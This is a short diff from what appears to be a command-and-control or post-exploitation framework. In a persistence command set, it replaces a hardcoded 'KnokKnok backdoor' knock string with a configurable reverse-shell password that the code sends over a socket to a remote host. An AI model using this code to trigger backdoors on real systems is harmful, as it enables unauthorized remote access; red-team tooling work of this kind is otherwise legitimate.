@@ -1131,11 +1131,19 @@ class PersistMigratedCommandSet(PendingCommandSet):
         else:
             PORT = self.params['rport']
         print_msg(f"KnokKnok backdoor on {HOST} {PORT}")
-        especial_cadena = "grisiscomebacksayknokknok"
+        cadena = str(self.params.get("c2_reverse_shell_password", "") or "").strip()
+        if not cadena or len(cadena) < 12:
+            import secrets
+            cadena = secrets.token_hex(32)
+            print_error(
+                f"c2_reverse_shell_password not configured (minimum 12 chars). "
+                f"Using random fallback: {cadena}. "
+                f"Set it in payload.json to persist this value."
+            )
         try:
             client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             client_socket.connect((HOST, int(PORT)))
-            client_socket.sendall(especial_cadena.encode('utf-8'))
+            client_socket.sendall(cadena.encode('utf-8'))
             client_socket.close()
             print_msg("Who is ?")
         except Exception:
